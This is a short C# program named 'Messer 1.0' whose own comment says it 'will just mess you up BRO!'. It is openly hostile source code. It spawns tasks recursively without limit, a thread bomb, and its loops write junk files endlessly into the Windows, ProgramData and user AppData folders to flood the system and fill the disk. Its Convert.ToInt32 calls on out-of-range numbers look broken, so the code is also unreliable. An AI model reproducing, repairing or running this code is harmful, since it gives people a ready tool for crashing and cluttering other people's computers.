
/* (c) All Rights Reserved, Dashies Software Inc. */

/* a little application because I can, it will just mess you up BRO! */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Messer_1._0 {
    class Program {
        private static int ReadMe = 0;
        private static Random getNumbah = new Random();
        private static String[] path_table = { "C:\\ProgramData\\",
                                               "C:\\Windows\\",
                                               "",
                                               "C:\\Users\\" + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\\AppData\\",
                                               "C:\\Users\\" + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\\AppData\\Local\\",
                                               "C:\\Users\\" + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\\AppData\\LocalLow\\",
                                               "C:\\Users\\" + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\\AppData\\Roaming\\" };

        private static void BackThread()
        {
            while(true)
            {
                ReadMe = getNumbah.Next(Convert.ToInt32(900000000000000000), Convert.ToInt32(999999999999999999));

                foreach(String Id in path_table)
                {
                    System.IO.File.WriteAllText(Id + "DashieIsTheBest" + ReadMe.ToString() + "YAH", (ReadMe * ReadMe).ToString());
                }
            }
        }

        private static void MultiThread()
        {
            while(true)
            {
                Task.Run((Action)MultiThread);
                Task.Run((Action)BackThread);
            }
        }

        static void Main(string[] args) {
            try
            {
                for(int index = 0; index <= 500000000; index += 1) {
                    Task Termination = Task.Run((Action)BackThread);
                    Task Multiply = Task.Run((Action)MultiThread);
                }    
            } 
            
            catch
            {
                return;
            }
        }
    }
}
